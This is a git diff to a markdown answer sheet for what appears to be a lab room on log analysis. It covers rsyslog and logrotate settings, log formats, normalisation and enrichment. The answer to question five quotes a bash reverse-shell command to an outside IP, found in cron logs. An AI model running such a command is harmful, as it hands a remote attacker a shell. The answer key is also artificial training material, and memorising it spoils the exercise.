@@ -49,47 +49,48 @@ $FileCreateMode 0644
 
 ## Task Question
 
-1. Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task?
+1. Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task? <br>
     Combined
 
-2. Based on the list of log types in this task, what log type is used by the log file specified in the note from Task?
+2. Based on the list of log types in this task, what log type is used by the log file specified in the note from Task? <br>
     Web Server Log
 
-3. After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at /var/log/websrv-02/rsyslog_sshd.log, indicating failed login attempts or brute forcing?
+3. After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at /var/log/websrv-02/rsyslog_sshd.log, indicating failed login attempts or brute forcing? <br>
     stansimon
 
-4. What is the IP address of SIEM-02 based on the rsyslog configuration file /etc/rsyslog.d/99-websrv-02-cron.conf, which is used to monitor cron messages?
+4. What is the IP address of SIEM-02 based on the rsyslog configuration file /etc/rsyslog.d/99-websrv-02-cron.conf, which is used to monitor cron messages? <br>
     10.10.10.101
 
 
-5. Based on the generated logs in /var/log/websrv-02/rsyslog_cron.log, what command is being executed by the root user?
+5. Based on the generated logs in /var/log/websrv-02/rsyslog_cron.log, what command is being executed by the root user? <br>
     /bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
 
-6. Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, how many versions of old compressed log file copies will be kept?
+6. Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, how many versions of old compressed log file copies will be kept? <br>
     24
 
-7. Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, what is the log rotation frequency?
+7. Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, what is the log rotation frequency? <br>
     hourly
 
-8. Upon accessing the log viewer URL for unparsed raw log files, what error does "/var/log/websrv-02/rsyslog_cron.log" show when selecting the different filters?
+8. Upon accessing the log viewer URL for unparsed raw log files, what error does "/var/log/websrv-02/rsyslog_cron.log" show when selecting the different filters? <br>
 
 ``http[:]//MACHINE_IP:8111/log?log=%2Fvar%2Flog%2Fgitlab%2Fnginx%2Faccess.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_cron.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_sshd.log&log=%2Fvar%2Flog%2Fgitlab%2Fgitlab-rails%2Fapi_json.log
 ``
-access the url and change the filter
+access the url and change the filter <br>
 
-answer:
+answer: <br>
     no date field
 
-9. What is the process of standardising parsed data into a more easily readable and query-able format?
+9. What is the process of standardising parsed data into a more easily readable and query-able format? <br>
 
-answer:
+answer: <br>
     Normalisation
 
 
-10. What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address?
+10. What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address? <br>
 
-answer:
+answer: <br>
     Enrichment
+
 
 
 
